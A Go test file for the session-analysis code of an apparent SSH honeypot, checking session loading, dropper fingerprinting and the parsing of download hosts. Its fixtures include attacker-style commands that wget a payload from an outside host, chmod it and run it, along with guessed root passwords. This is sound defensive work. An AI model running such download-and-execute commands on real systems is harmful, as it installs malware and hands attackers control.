package analysis

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/recorder"
)

// writeRecording produces a real recording with the real recorder, so the
// loader is always tested against the format the honeypot actually emits.
func writeRecording(t *testing.T, dir, connID, remote string, at time.Time, fn func(*recorder.Sink)) {
	t.Helper()
	r := recorder.New(dir)
	s := r.Begin(connID, remote, at)
	fn(s)
	s.End(nil, at.Add(30*time.Second))
}

func TestLoadReconstructsASession(t *testing.T) {
	dir := t.TempDir()
	at := time.Date(2026, 9, 20, 3, 14, 0, 0, time.UTC)
	writeRecording(t, dir, "20260920T031400-aaaa", "198.51.100.23:51000", at, func(s *recorder.Sink) {
		s.Auth("password", "root", "admin", "", "", false)
		s.Auth("password", "root", "123456", "", "", true)
		s.Session(true, "xterm", "")
		s.Command("uname -a", "/root", "root", 0)
		s.Command("wget http://198.51.100.9/bins.sh -O /tmp/b", "/root", "root", 0)
		s.Download("wget", "http://198.51.100.9/bins.sh", "GET", "/tmp/b")
		s.ModelCall("command:vmstat", "fake", 100)
	})

	sessions, err := Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(sessions) != 1 {
		t.Fatalf("got %d sessions", len(sessions))
	}
	s := sessions[0]

	if s.ConnID != "20260920T031400-aaaa" || s.RemoteIP != "198.51.100.23" {
		t.Errorf("identity wrong: %+v", s)
	}
	if !s.Start.Equal(at) || s.Duration != 30*time.Second {
		t.Errorf("timing wrong: start=%v duration=%v", s.Start, s.Duration)
	}
	if len(s.Auths) != 2 || s.Accepted == nil || s.Accepted.Password != "123456" {
		t.Errorf("auth wrong: %+v accepted=%+v", s.Auths, s.Accepted)
	}
	if s.Credentials() != "root:123456" {
		t.Errorf("credentials = %q", s.Credentials())
	}
	if !s.Interactive {
		t.Error("should be interactive (pty requested)")
	}
	if len(s.Commands) != 2 || s.FirstCommand() != "uname -a" {
		t.Errorf("commands wrong: %+v", s.Commands)
	}
	if len(s.Downloads) != 1 || s.Downloads[0].Host() != "198.51.100.9" {
		t.Errorf("downloads wrong: %+v", s.Downloads)
	}
	if s.ModelCalls != 1 {
		t.Errorf("model calls = %d", s.ModelCalls)
	}
	if s.Incomplete {
		t.Error("session had a disconnect event, should not be incomplete")
	}
	// IOCs ride along on the command that carried the URL.
	if len(s.Commands[1].IOCs.URLs) != 1 {
		t.Errorf("IOCs not carried: %+v", s.Commands[1].IOCs)
	}
}

func TestFingerprintAndCommandName(t *testing.T) {
	s := &Session{Commands: []Command{
		{Line: "cd /tmp"}, {Line: "/bin/busybox wget http://x/y"}, {Line: "chmod 777 y"}, {Line: "./y"},
	}}
	if got := s.Fingerprint(); got != "cd → busybox → chmod → ./payload" {
		t.Errorf("fingerprint = %q", got)
	}
	// Two droppers that differ only in payload name cluster together.
	a := &Session{Commands: []Command{{Line: "wget http://a/x86"}, {Line: "chmod +x x86"}, {Line: "./x86"}}}
	b := &Session{Commands: []Command{{Line: "wget http://b/arm7"}, {Line: "chmod +x arm7"}, {Line: "/tmp/arm7"}}}
	if a.Fingerprint() != b.Fingerprint() {
		t.Errorf("payload name should not split the cluster:\n  %q\n  %q", a.Fingerprint(), b.Fingerprint())
	}
	// A path-qualified binary clusters with its bare name.
	if n := (Command{Line: "/usr/bin/wget http://x"}).Name(); n != "wget" {
		t.Errorf("name = %q", n)
	}
	if n := (Command{Line: ""}).Name(); n != "" {
		t.Errorf("empty name = %q", n)
	}
	empty := &Session{}
	if got := empty.Fingerprint(); got != "(no commands)" {
		t.Errorf("empty fingerprint = %q", got)
	}
	if empty.Credentials() != "" || empty.FirstCommand() != "" {
		t.Error("empty session accessors should be empty")
	}
}

func TestDownloadHost(t *testing.T) {
	cases := map[string]string{
		"http://198.51.100.9/bins.sh": "198.51.100.9",
		"https://evil.example:8080/a": "evil.example",
		"tftp://10.0.0.1/payload":     "10.0.0.1",
		"ftp://user.example/x":        "user.example",
		"not a url":                   "",
		"http://user@evil.example/a":  "evil.example",
	}
	for url, want := range cases {
		if got := (Download{URL: url}).Host(); got != want {
			t.Errorf("Host(%q) = %q, want %q", url, got, want)
		}
	}
}

func TestLoadSkipsJunkAndOrdersByTime(t *testing.T) {
	dir := t.TempDir()
	base := time.Date(2026, 9, 20, 10, 0, 0, 0, time.UTC)
	// Written out of order; Load must sort by start time.
	writeRecording(t, dir, "second", "198.51.100.2:1", base.Add(time.Hour), func(s *recorder.Sink) {
		s.Command("ls", "/root", "root", 0)
	})
	writeRecording(t, dir, "first", "198.51.100.1:1", base, func(s *recorder.Sink) {
		s.Command("id", "/root", "root", 0)
	})
	// A malformed file and a non-JSONL file must not break the load.
	day := filepath.Join(dir, "sessions", base.Format("2006-01-02"))
	if err := writeFile(filepath.Join(day, "torn.jsonl"), "{not json\n"); err != nil {
		t.Fatal(err)
	}
	if err := writeFile(filepath.Join(day, "notes.txt"), "ignore me"); err != nil {
		t.Fatal(err)
	}

	sessions, err := Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(sessions) != 2 {
		t.Fatalf("got %d sessions, want 2", len(sessions))
	}
	if sessions[0].ConnID != "first" || sessions[1].ConnID != "second" {
		t.Errorf("order = %s, %s", sessions[0].ConnID, sessions[1].ConnID)
	}
}

func TestLoadMissingDirIsNotAnError(t *testing.T) {
	sessions, err := Load(t.TempDir()) // no sessions/ subdirectory yet
	if err != nil || sessions != nil {
		t.Errorf("empty data dir: %v sessions, err %v", len(sessions), err)
	}
}

func TestIncompleteRecording(t *testing.T) {
	dir := t.TempDir()
	at := time.Date(2026, 9, 20, 5, 0, 0, 0, time.UTC)
	// A session still in progress: connect + a command, no disconnect.
	r := recorder.New(dir)
	s := r.Begin("live", "198.51.100.5:2", at)
	s.Command("whoami", "/root", "root", 0)

	sessions, err := Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(sessions) != 1 {
		t.Fatalf("got %d", len(sessions))
	}
	if !sessions[0].Incomplete {
		t.Error("a recording with no disconnect should be marked incomplete")
	}
	if len(sessions[0].Commands) != 1 {
		t.Error("commands before the cut should still load")
	}
}

func writeFile(path, content string) error {
	return osWriteFile(path, content)
}
